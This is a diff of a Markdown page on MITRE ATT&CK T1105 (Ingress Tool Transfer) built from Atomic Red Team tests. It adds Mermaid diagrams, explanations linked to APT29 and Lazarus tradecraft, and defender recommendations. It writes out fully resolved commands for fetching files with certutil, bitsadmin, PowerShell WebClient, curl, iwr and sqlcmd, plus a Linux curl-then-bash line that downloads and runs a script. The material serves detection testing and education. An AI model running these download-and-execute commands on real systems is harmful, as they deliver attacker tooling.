@@ -1,4 +1,4 @@
-I'll correct the Mermaid diagram syntax issues. The problem is with the HTML line breaks (`<br>`) and special characters that need to be properly handled in Mermaid syntax.
+I'll add the diagrams and explanations to this T1105 technique file:
 
 # T1105 - Ingress Tool Transfer
 
@@ -8,6 +8,48 @@ Adversaries may transfer tools or other files from an external system into a com
 
 Files can also be transferred using various [Web Service](https://attack.mitre.org/techniques/T1102)s as well as native or otherwise pre-installed tools on the victim system.(Citation: Google Download Tool)(Citation: Microsoft MSDT LOLBins)(Citation: Cisco Use of Living Off The Land Binaries and Scripts in Attacks)(Citation: Mandiant APT41)
 </blockquote>
+
+## Overall T1105 Technique Diagram
+
+```mermaid
+flowchart TD
+    subgraph AdversaryInfrastructure [Adversary-Controlled Infrastructure]
+        direction LR
+        A1[APT29 Infrastructure]
+        A2[Lazarus Infrastructure]
+        Payload[Malicious Files/Tools]
+        A1 & A2 -- host --> Payload
+    end
+
+    subgraph TransferMethods [Ingress Tool Transfer Methods]
+        direction TB
+        TM1[LOLBin Abuse<br>certutil, BITSAdmin]
+        TM2[PowerShell Variants<br>WebClient, iwr, DownloadString]
+        TM3[Cross-Platform Tools<br>curl, wget]
+        TM4[Database Tools<br>sqlcmd]
+    end
+
+    subgraph TargetSystems [Victim Environment]
+        V1[Windows Systems]
+        V2[Linux Systems]
+    end
+
+    AdversaryInfrastructure -->|Hosts payloads| TransferMethods
+    TransferMethods -->|Delivers to| TargetSystems
+    
+    TM1 --> V1
+    TM2 --> V1
+    TM3 --> V1 & V2
+    TM4 --> V1
+
+    classDef apt29 fill:#ffcccc,stroke:#ff0000,stroke-width:2px
+    classDef lazarus fill:#ccffcc,stroke:#006600,stroke-width:2px
+    classDef both fill:#ffcc99,stroke:#ff9900,stroke-width:2px
+
+    class A1,TM1,TM4 apt29
+    class A2,TM3 lazarus
+    class TM2 both
+```
 
 ### Attack Technique Overview
 Ingress Tool Transfer involves adversaries bringing additional tools into a compromised environment. Both APT29 (Russian state-sponsored) and Lazarus Group (North Korean state-sponsored) extensively use this technique to deliver malware, post-exploitation tools, and maintain persistence. They leverage legitimate system utilities and living-off-the-land techniques to evade detection.
@@ -42,7 +84,7 @@ flowchart TD
     F2 --> H
     G2 --> H
     
-    H --> I[Payload Execution & System Compromise]
+    H --> I[Payload Execution<br>& System Compromise]
 ```
 
 ## Atomic Tests
@@ -61,43 +103,6 @@ flowchart TD
 ## Atomic Test #7 - certutil download (urlcache)
 Uses certutil with -urlcache to download files. APT29 has extensively used certutil for downloading additional tools and payloads during operations.
 
-```mermaid
-flowchart TD
-    subgraph TestOrchestration [Test Setup & Prerequisite Check]
-        direction TB
-        Start[Atomic Test Started] --> CheckPrereq["Execute Prerequisite Check<br>(PowerShell):"]
-        CheckPrereq --> PrereqCmd["if Get-Command certutil<br>then exit 0 else exit 1"]
-        PrereqCmd --> CertUtilFound{"Is certutil.exe<br>available on the system?"}
-        
-        CertUtilFound -- Yes (exit 0) --> PrereqSuccess[Prerequisite Met]
-        CertUtilFound -- No (exit 1) --> PrereqFail[Prerequisite Failed<br>Test Aborted]
-        
-        PrereqSuccess --> ExecuteAttack
-    end
-
-    ExecuteAttack["Execute Attack Command<br>(Command Prompt):<br>certutil -urlcache -split -f #{url} #{output_file}"]
-
-    subgraph AttackBreakdown [Command Breakdown]
-        Cert[certutil.exe] -- -urlcache --> AccessURL[Access URL Cache]
-        Cert -- -split --> SaveFile[Split & Save to File]
-        Cert -- -f --> Force[Force Overwrite]
-        
-        ExecuteAttack --> Cert
-        Force --> Download[Download from URL]
-    end
-
-    subgraph ExternalSource [External Source]
-        SourceURL[#{url}<br>Default: Raw GitHub URL]
-    end
-
-    Download -->|HTTP GET Request| SourceURL
-    SourceURL -->|Stream File Content| AttackBreakdown
-
-    AttackBreakdown --> WriteFile[Write Content to Disk]
-    WriteFile --> LocalFile["#{output_file}<br>Default: 'Atomic-license.txt'"]
-    LocalFile --> Success[Download Successful]
-```
-
 **Supported Platforms:** Windows
 
 **auto_generated_guid:** 7a8b9c0d-1e2f-3a4b-5c6d-7e8f9a0b1c2d
@@ -113,6 +118,41 @@ flowchart TD
 certutil -urlcache -split -f #{url} #{output_file}
 ```
 
+```mermaid
+flowchart TD
+    Start[Test #7: certutil download] --> CheckPrereq["Prerequisite Check:<br>Get-Command certutil"]
+    CheckPrereq --> CertUtilFound{"certutil available?"}
+    
+    CertUtilFound -- Yes --> ExecuteAttack["Execute: certutil -urlcache -split -f<br>https://raw.githubusercontent.com/.../LICENSE.txt<br>Atomic-license.txt"]
+    CertUtilFound -- No --> Abort[Test Aborted]
+    
+    ExecuteAttack --> Breakdown[Command Breakdown]
+    
+    subgraph Breakdown [certutil flags explanation]
+        C1[certutil.exe] --> F1[-urlcache: Enable URL access]
+        C1 --> F2[-split: Save to file not stdout]
+        C1 --> F3[-f: Force overwrite silently]
+    end
+    
+    Breakdown --> Network[Makes HTTP GET request]
+    Network --> Download[Downloads file content]
+    Download --> Save[Saves to Atomic-license.txt]
+    Save --> Success[Transfer Complete]
+```
+
+**Command Explanation:**
+```cmd
+certutil -urlcache -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt Atomic-license.txt
+```
+- **certutil.exe**: Legitimate Windows certificate utility abused as LOLBin
+- **-urlcache**: Enables URL interaction functionality
+- **-split**: Critical flag that saves content to file instead of displaying it
+- **-f**: Forces overwrite without prompting user
+- **URL**: Source location (benign in test, malicious in real attacks)
+- **Output filename**: Local destination for downloaded content
+
+APT29 has extensively used certutil for downloading tools during operations like SolarWinds, as it blends with normal administrative activity.
+
 #### Dependencies: Run with `powershell`!
 ##### Description: certutil must be available
 ##### Check Prereq Commands:
@@ -124,20 +164,6 @@ if (Get-Command certutil -ErrorAction SilentlyContinue) { exit 0 } else { exit 1
 
 ## Atomic Test #9 - Windows - BITSAdmin BITS Download
 Uses BITSAdmin to schedule file downloads. Both APT29 and Lazarus use BITSAdmin for stealthy file transfers.
-
-```mermaid
-flowchart TD
-    A[Adversary Server] --> B[BITSAdmin Transfer Job]
-    B --> C[Background Intelligent Transfer Service]
-    C --> D[Low-Priority Network Traffic - Blends with legitimate updates]
-    D --> E[File Download Completion]
-    E --> F[Persistence Mechanism - Job completion triggers execution]
-    
-    C --> G[Stealth Advantages - Operates at system level - Bypasses many firewalls]
-    
-    style A fill:#ff9999
-    style F fill:#ff9999
-```
 
 **Supported Platforms:** Windows
 
@@ -154,6 +180,39 @@ flowchart TD
 bitsadmin /transfer AtomicDownload /Priority HIGH #{url} #{output_file}
 ```
 
+```mermaid
+flowchart TD
+    Start[Test #9: BITSAdmin Download] --> Execute["Execute: bitsadmin /transfer qcxjb7 /Priority HIGH<br>https://raw.githubusercontent.com/.../LICENSE.txt<br>%temp%\Atomic-license.txt"]
+    
+    Execute --> Breakdown[Command Breakdown]
+    
+    subgraph Breakdown [BITSAdmin parameters]
+        B1[bitsadmin] --> P1[/transfer: Create transfer job]
+        B1 --> P2[qcxjb7: Arbitrary job name]
+        B1 --> P3[/Priority HIGH: Set priority level]
+        B1 --> P4[URL: Download source]
+        B1 --> P5[Path: Download destination]
+    end
+    
+    Breakdown --> CreateJob[Creates BITS transfer job]
+    CreateJob --> Background[Downloads in background]
+    Background --> Persist[Job persists across reboots]
+    Persist --> Complete[Transfer completes]
+```
+
+**Command Explanation:**
+```cmd
+bitsadmin /transfer qcxjb7 /Priority HIGH https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt %temp%\Atomic-license.txt
+```
+- **bitsadmin**: Windows tool for managing BITS (Background Intelligent Transfer Service)
+- **/transfer**: Creates a new transfer job
+- **qcxjb7**: Arbitrary job name (would be randomized in real attacks)
+- **/Priority HIGH**: Sets the transfer priority
+- **URL**: Source file to download
+- **%temp%\Atomic-license.txt**: Destination path (temporary folder)
+
+Both APT29 and Lazarus use BITSAdmin for stealthy transfers as it's designed for reliable, resumable background downloads that blend with legitimate Windows update activity.
+
 #### Dependencies: Run with `powershell`!
 ##### Description: BITSAdmin must be available
 ##### Check Prereq Commands:
@@ -165,20 +224,6 @@ if (Get-Command bitsadmin -ErrorAction SilentlyContinue) { exit 0 } else { exit 
 
 ## Atomic Test #10 - Windows - PowerShell Download
 Uses .NET WebClient to download files. Common technique used by both APT29 and Lazarus groups.
-
-```mermaid
-flowchart TD
-    A[Adversary Server] --> B[PowerShell WebClient Object]
-    B --> C[.NET Framework DownloadFile Method]
-    C --> D[Direct File Transfer - No intermediate storage]
-    D --> E[Local File Storage]
-    E --> F[Immediate Execution - Often combined with other commands]
-    
-    B --> G[Evasion Techniques - Memory-only execution possible - Bypasses file scanning]
-    
-    style A fill:#ff9999
-    style F fill:#ff9999
-```
 
 **Supported Platforms:** Windows
 
@@ -195,24 +240,40 @@ flowchart TD
 (New-Object System.Net.WebClient).DownloadFile("#{url}", "#{output_file}")
 ```
 
+```mermaid
+flowchart TD
+    Start[Test #10: PowerShell Download] --> Execute["Execute: New-Object System.Net.WebClient<br>.DownloadFile'https://raw.githubusercontent.com/.../LICENSE.txt'<br>'$env:TEMP\Atomic-license.txt'"]
+    
+    Execute --> Breakdown[Command Breakdown]
+    
+    subgraph Breakdown [PowerShell .NET method]
+        P1[New-Object] --> C1[System.Net.WebClient]
+        C1 --> M1[.DownloadFile method]
+        M1 --> U1[Source URL parameter]
+        M1 --> U2[Destination path parameter]
+    end
+    
+    Breakdown --> CreateObject[Creates WebClient object]
+    CreateObject --> Download[Downloads file]
+    Download --> Save[Saves to temp directory]
+    Save --> Success[Transfer Complete]
+```
+
+**Command Explanation:**
+```powershell
+(New-Object System.Net.WebClient).DownloadFile("https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt", "$env:TEMP\Atomic-license.txt")
+```
+- **New-Object System.Net.WebClient**: Creates a .NET WebClient object
+- **.DownloadFile()**: Method that downloads a file from a URL to a local path
+- **Source URL**: First parameter - where to download from
+- **Destination path**: Second parameter - where to save the file
+
+This technique is popular with both groups because PowerShell is ubiquitous in Windows environments and provides powerful capabilities with minimal footprint.
+
 <br/>
 
 ## Atomic Test #15 - File Download via PowerShell
 Uses DownloadString with Out-File for downloads. Both groups use this method for downloading and writing files.
-
-```mermaid
-flowchart TD
-    A[Adversary Server] --> B[PowerShell DownloadString]
-    B --> C[Content Retrieval as Text]
-    C --> D[Out-File Command]
-    D --> E[File Reconstruction]
-    E --> F[Script Execution - Often PowerShell scripts or batch files]
-    
-    B --> G[Text-Based Evasion - Can bypass content filters - Base64 encoding common]
-    
-    style A fill:#ff9999
-    style F fill:#ff9999
-```
 
 **Supported Platforms:** Windows
 
@@ -229,24 +290,40 @@ flowchart TD
 (New-Object Net.WebClient).DownloadString('#{url}') | Out-File #{output_file}
 ```
 
+```mermaid
+flowchart TD
+    Start[Test #15: PowerShell DownloadString] --> Execute["Execute: New-Object Net.WebClient<br>.DownloadString'https://raw.githubusercontent.com/.../LICENSE.txt'<br>| Out-File LICENSE.txt"]
+    
+    Execute --> Breakdown[Command Breakdown]
+    
+    subgraph Breakdown [DownloadString method]
+        P1[New-Object] --> C1[Net.WebClient]
+        C1 --> M1[.DownloadString method]
+        M1 --> U1[Source URL parameter]
+        M1 --> P2[| Out-File: Pipe to file]
+    end
+    
+    Breakdown --> CreateObject[Creates WebClient object]
+    CreateObject --> Download[Downloads string content]
+    Download --> Pipe[Pipes content to Out-File]
+    Pipe --> Save[Saves to LICENSE.txt]
+    Save --> Success[Transfer Complete]
+```
+
+**Command Explanation:**
+```powershell
+(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/redcanaryco/atomic-red-team/4042cb3433bce024e304500dcfe3c5590571573a/LICENSE.txt') | Out-File LICENSE.txt
+```
+- **DownloadString()**: Method that downloads content as a string (instead of a file)
+- **| Out-File**: Pipes the string content to the Out-File cmdlet to save it
+- **LICENSE.txt**: Output filename
+
+This approach is useful for downloading scripts or text-based payloads that don't need to maintain binary integrity.
+
 <br/>
 
 ## Atomic Test #18 - Curl Download File
 Uses curl.exe to download files on Windows. Lazarus Group frequently uses curl for downloading tools.
-
-```mermaid
-flowchart TD
-    A[Adversary Server] --> B[Curl.exe Command]
-    B --> C[HTTP/HTTPS Request]
-    C --> D[Certificate Validation Bypass - -k flag]
-    D --> E[File Download]
-    E --> F[Execution on Target System]
-    
-    B --> G[Legitimate Tool Abuse - Often pre-installed on systems - Common in Lazarus attacks]
-    
-    style A fill:#ff9999
-    style F fill:#ff9999
-```
 
 **Supported Platforms:** Windows
 
@@ -263,6 +340,37 @@ flowchart TD
 curl -k #{url} -o #{output_file}
 ```
 
+```mermaid
+flowchart TD
+    Start[Test #18: curl Download] --> Execute["Execute: curl -k https://github.com/.../AllTheThingsx64.dll<br>-o c:\users\public\music\allthethingsx64.dll"]
+    
+    Execute --> Breakdown[Command Breakdown]
+    
+    subgraph Breakdown [curl parameters]
+        C1[curl] --> P1[-k: Ignore certificate errors]
+        C1 --> P2[URL: Download source]
+        C1 --> P3[-o: Output file flag]
+        C1 --> P4[Path: Download destination]
+    end
+    
+    Breakdown --> Request[Makes HTTPS request]
+    Request --> Download[Downloads file content]
+    Download --> Save[Saves to public music folder]
+    Save --> Success[Transfer Complete]
+```
+
+**Command Explanation:**
+```cmd
+curl -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll -o c:\users\public\music\allthethingsx64.dll
+```
+- **curl**: Cross-platform command-line tool for transferring data
+- **-k**: Ignores SSL certificate errors (bypasses certificate validation)
+- **URL**: Source file to download
+- **-o**: Specifies the output filename
+- **Public music folder**: Common directory Lazarus uses to avoid suspicion
+
+Lazarus frequently uses curl for its simplicity and cross-platform compatibility, often targeting unconventional directories.
+
 #### Dependencies: Run with `powershell`!
 ##### Description: curl must be available
 ##### Check Prereq Commands:
@@ -274,20 +382,6 @@ if (Get-Command curl -ErrorAction SilentlyContinue) { exit 0 } else { exit 1 }
 
 ## Atomic Test #27 - Linux Download File and Run
 Uses curl to download and execute on Linux. Lazarus targets Linux environments using this method.
-
-```mermaid
-flowchart TD
-    A[Adversary Server] --> B[Curl Command]
-    B --> C[Silent Download - -s flag]
-    C --> D[File Save & Execute Permissions - chmod +x]
-    D --> E[Immediate Execution - bash/pipeline execution]
-    E --> F[Linux System Compromise]
-    
-    B --> G[Linux Targeting - Lazarus expansion to Linux - Cloud infrastructure attacks]
-    
-    style A fill:#ff9999
-    style F fill:#ff9999
-```
 
 **Supported Platforms:** Linux
 
@@ -303,6 +397,37 @@ flowchart TD
 curl -sO #{url}; chmod +x atomic.sh | bash atomic.sh
 ```
 
+```mermaid
+flowchart TD
+    Start[Test #27: Linux curl Download & Execute] --> Execute["Execute: curl -sO https://raw.githubusercontent.com/.../atomic.sh<br>chmod +x atomic.sh | bash atomic.sh"]
+    
+    Execute --> Breakdown[Command Breakdown]
+    
+    subgraph Breakdown [curl and execution]
+        C1[curl] --> P1[-s: Silent mode]
+        C1 --> P2[-O: Save with remote name]
+        C1 --> P3[URL: Download source]
+        C1 --> S1[chmod +x: Make executable]
+        C1 --> S2[| bash: Execute with bash]
+    end
+    
+    Breakdown --> SilentDownload[Downloads file silently]
+    SilentDownload --> MakeExec[Makes file executable]
+    MakeExec --> ExecuteFile[Executes script]
+    ExecuteFile --> Success[Execution Complete]
+```
+
+**Command Explanation:**
+```sh
+curl -sO https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1105/src/atomic.sh; chmod +x atomic.sh | bash atomic.sh
+```
+- **curl -sO**: Silent mode that saves file with original name
+- **chmod +x**: Makes the downloaded file executable
+- **| bash**: Pipes the script to bash for immediate execution
+- **Semicolon (;)**: Command separator to chain operations
+
+This demonstrates Lazarus's cross-platform capabilities, targeting Linux systems with immediate execution of downloaded scripts.
+
 #### Dependencies: Run with `sh`!
 ##### Description: curl must be available
 ##### Check Prereq Commands:
@@ -314,20 +439,6 @@ if command -v curl >/dev/null 2>&1; then exit 0; else exit 1; fi
 
 ## Atomic Test #29 - iwr or Invoke Web-Request download
 Uses Invoke-WebRequest (iwr) as an alternative download method. APT29 uses this technique.
-
-```mermaid
-flowchart TD
-    A[Adversary Server] --> B[Invoke-WebRequest Cmdlet]
-    B --> C[PowerShell HTTP Handling]
-    C --> D[Comprehensive Web Request - Headers, cookies, authentication]
-    D --> E[File Output - -OutFile parameter]
-    E --> F[System Compromise]
-    
-    B --> G[Advanced Evasion - User-agent spoofing - Referrer manipulation - Proxy support]
-    
-    style A fill:#ff9999
-    style F fill:#ff9999
-```
 
 **Supported Platforms:** Windows
 
@@ -344,25 +455,36 @@ flowchart TD
 Invoke-WebRequest -URI #{url} -OutFile #{output_file}
 ```
 
+```mermaid
+flowchart TD
+    Start[Test #29: Invoke-WebRequest Download] --> Execute["Execute: powershell.exe iwr -URI https://raw.githubusercontent.com/.../LICENSE.txt<br>-Outfile %temp%\Atomic-license.txt"]
+    
+    Execute --> Breakdown[Command Breakdown]
+    
+    subgraph Breakdown [iwr parameters]
+        I1[iwr] --> P1[-URI: Source URL parameter]
+        I1 --> P2[-Outfile: Output file parameter]
+    end
+    
+    Breakdown --> Download[Downloads file]
+    Download --> Save[Saves to temp directory]
+    Save --> Success[Transfer Complete]
+```
+
+**Command Explanation:**
+```cmd
+powershell.exe iwr -URI https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt -Outfile %temp%\Atomic-license.txt
+```
+- **iwr**: Alias for Invoke-WebRequest PowerShell cmdlet
+- **-URI**: Parameter specifying the source URL
+- **-Outfile**: Parameter specifying the destination path
+
+APT29 uses this method as an alternative to .NET WebClient, particularly in environments where other techniques might be monitored.
+
 <br/>
 
 ## Atomic Test #32 - File Download with Sqlcmd.exe
 Uses sqlcmd for file downloads. APT29 has abused SQLCMD for file transfers.
-
-```mermaid
-flowchart TD
-    A[Adversary Server] --> B[sqlcmd Utility]
-    B --> C[Input File Parameter - -i flag]
-    C --> D[SQL Server Protocol Abuse]
-    D --> E[File Content Retrieval]
-    E --> F[Output Redirection - -o parameter]
-    F --> G[System Compromise]
-    
-    B --> H[Database Tool Misuse - Blends with legitimate DB traffic - Often allowed through firewalls]
-    
-    style A fill:#ff9999
-    style G fill:#ff9999
-```
 
 **Supported Platforms:** Windows
 
@@ -379,12 +501,56 @@ flowchart TD
 sqlcmd -i #{url} -o #{output_file}
 ```
 
+```mermaid
+flowchart TD
+    Start[Test #32: sqlcmd Download] --> CheckPrereq["Prerequisite Check:<br>Get-Command sqlcmd"]
+    CheckPrereq --> SqlcmdFound{"sqlcmd available?"}
+    
+    SqlcmdFound -- Yes --> ExecuteAttack["Execute: sqlcmd -i https://github.com/.../T1105.zip<br>-o C:\T1105.zip"]
+    SqlcmdFound -- No --> Abort[Test Aborted]
+    
+    ExecuteAttack --> Breakdown[Command Breakdown]
+    
+    subgraph Breakdown [sqlcmd parameters]
+        S1[sqlcmd] --> P1[-i: Input file flag]
+        S1 --> P2[URL: Remote script location]
+        S1 --> P3[-o: Output file flag]
+        S1 --> P4[Path: Output destination]
+    end
+    
+    Breakdown --> Request[Makes HTTP request]
+    Request --> Download[Downloads file content]
+    Download --> Save[Saves to C:\T1105.zip]
+    Save --> Success[Transfer Complete]
+```
+
+**Command Explanation:**
+```powershell
+sqlcmd -i https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1105/src/T1105.zip -o C:\T1105.zip
+```
+- **sqlcmd**: Command-line utility for SQL Server
+- **-i**: Normally used to specify an input script file
+- **URL**: Abused to point to a remote file instead of local
+- **-o**: Redirects output to a file instead of console
+
+This demonstrates APT29's sophisticated tradecraft in abusing unexpected legitimate tools, often bypassing security controls that don't monitor database utilities for network activity.
+
 #### Dependencies: Run with `powershell`!
 ##### Description: sqlcmd must be available
 ##### Check Prereq Commands:
 ```powershell
 if (Get-Command sqlcmd -ErrorAction SilentlyContinue) { exit 0 } else { exit 1 }
 ```
+
+## Defender Recommendations
+
+Based on these tests, defenders should:
+
+1. **Monitor for unusual process relationships** - certutil, BITSAdmin, or sqlcmd making network connections
+2. **Implement application control** to restrict unnecessary utilities from non-admin users
+3. **Monitor PowerShell for download cradles** - particularly WebClient and DownloadString usage
+4. **Establish network baselines** to detect unusual outbound connections from trusted processes
+5. **Use behavioral detection** rather than just signature-based approaches for these living-off-the-land techniques
 
 ## Correlation with APT29 & Lazarus
 
